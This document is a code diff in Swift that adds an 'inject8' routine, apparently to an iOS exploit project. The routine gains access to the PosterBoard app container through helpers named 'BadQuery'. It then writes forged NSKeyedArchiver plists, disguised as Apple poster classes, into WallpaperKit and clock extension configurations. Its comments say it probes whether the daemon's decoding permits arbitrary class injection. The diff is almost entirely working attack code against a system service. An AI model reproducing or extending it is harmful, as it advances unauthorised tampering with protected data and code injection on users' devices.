@@ -2182,11 +2182,109 @@ class SymHandler {
         return a.encodedData
     }
 
-    static var payloadMetadata:      Data { nska(_MetaProxy()) }
-    static var payloadRendering:     Data { nska(_RenderingProxy()) }
-    static var payloadTitleStyle:    Data { nska(_TitleStyleProxy()) }
-    static var payloadComplication:  Data { nska(_ComplicationProxy()) }
-    static var payloadQuickActions:  Data { nska(_QuickActionsProxy()) }
+    // Probe variant: encodes NSDictionary for "complications" instead of NSArray.
+    // If posterboardd decodes this without fallback → decodeObjectForKey: is unrestricted
+    // → arbitrary class injection viable.  If fallback/crash → secure coding enforced.
+    @objc(_PP7ComplicationProbeProxy)
+    private class _ComplicationProbeProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterComplicationLayout") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(NSDictionary(),forKey: "complications")  // WRONG TYPE: NSDictionary not NSArray
+            coder.encode(false,          forKey: "complicationsUseBottomLayout")
+            coder.encode(NSArray(),      forKey: "sidebarComplications")
+        }
+    }
+
+    static var payloadMetadata:           Data { nska(_MetaProxy()) }
+    static var payloadRendering:          Data { nska(_RenderingProxy()) }
+    static var payloadTitleStyle:         Data { nska(_TitleStyleProxy()) }
+    static var payloadComplication:       Data { nska(_ComplicationProxy()) }
+    static var payloadQuickActions:       Data { nska(_QuickActionsProxy()) }
+    static var payloadComplicationProbe:  Data { nska(_ComplicationProbeProxy()) }
+
+    // MARK: - inject8: class-matched to ALL providers + NSDictionary probe on WallpaperKit complication
+
+    @discardableResult
+    static func inject8() -> String {
+        var diag = ["=== Inject v8 (decode-security probe) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        diag.append("complicationProbe: \(payloadComplicationProbe.count)b (NSDictionary for complications key)")
+        p7DumpNSKAKeys(data: payloadComplicationProbe, indent: "  ", diag: &diag)
+
+        let normalFiles: [(String, String, Data)] = [
+            ("titleStyle",   "com.apple.posterkit.provider.instance.titleStyleConfiguration.plist",   payloadTitleStyle),
+            ("rendering",    "com.apple.posterkit.provider.instance.renderingConfiguration.plist",    payloadRendering),
+            ("complication", "com.apple.posterkit.provider.instance.complicationLayout.plist",        payloadComplication),
+            ("quickActions", "com.apple.posterkit.provider.instance.quickActions.plist",              payloadQuickActions),
+        ]
+        let probeFiles: [(String, String, Data)] = [
+            ("titleStyle",   "com.apple.posterkit.provider.instance.titleStyleConfiguration.plist",   payloadTitleStyle),
+            ("rendering",    "com.apple.posterkit.provider.instance.renderingConfiguration.plist",    payloadRendering),
+            ("complication", "com.apple.posterkit.provider.instance.complicationLayout.plist",        payloadComplicationProbe),
+            ("quickActions", "com.apple.posterkit.provider.instance.quickActions.plist",              payloadQuickActions),
+        ]
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        let extBase   = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        var totalWritten = 0
+        for extName in allExts where !extName.hasPrefix(".") {
+            let isWK = extName.contains("WallpaperKit")
+            let isClock = extName.contains("ClockPoster") || extName.contains("PhotosAmbient")
+            guard isWK || isClock else { continue }
+
+            for subdir in ["configurations"] {
+                let sdPath = "\(extBase)/\(extName)/\(subdir)"
+                guard let sdH = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sdH.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for cfg in configs where !cfg.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(cfg)/versions"
+                    guard let versH = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { versH.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        guard let vH = try? BadQuery.consume(path: vPath, create: true) else { continue }
+                        defer { vH.release() }
+                        _ = (try? fm.contentsOfDirectory(atPath: vPath)) ?? []
+
+                        // WallpaperKit gets the probe complication; others get normal
+                        let files = isWK ? probeFiles : normalFiles
+                        let label = isWK ? "WK-PROBE" : "NORMAL"
+                        diag.append("\n\(extName.prefix(28))/\(cfg.prefix(8))/v\(ver) [\(label)]:")
+                        for (name, fileName, payload) in files {
+                            let path = "\(vPath)/\(fileName)"
+                            if let fH = try? BadQuery.consume(path: path, create: true) { fH.release() }
+                            let wrote = fm.createFile(atPath: path, contents: payload, attributes: nil)
+                                || ((try? payload.write(to: URL(fileURLWithPath: path), options: [])) != nil)
+                            diag.append("  \(name): \(wrote ? "WRITTEN \(payload.count)b" : "FAIL")")
+                            if wrote { totalWritten += 1 }
+                        }
+                    }
+                }
+            }
+        }
+        diag.append("\ntotal written: \(totalWritten)")
+        return pbSave(diag)
+    }
 
     // MARK: - inject7: write class-matched payloads into WallpaperKit versions
 
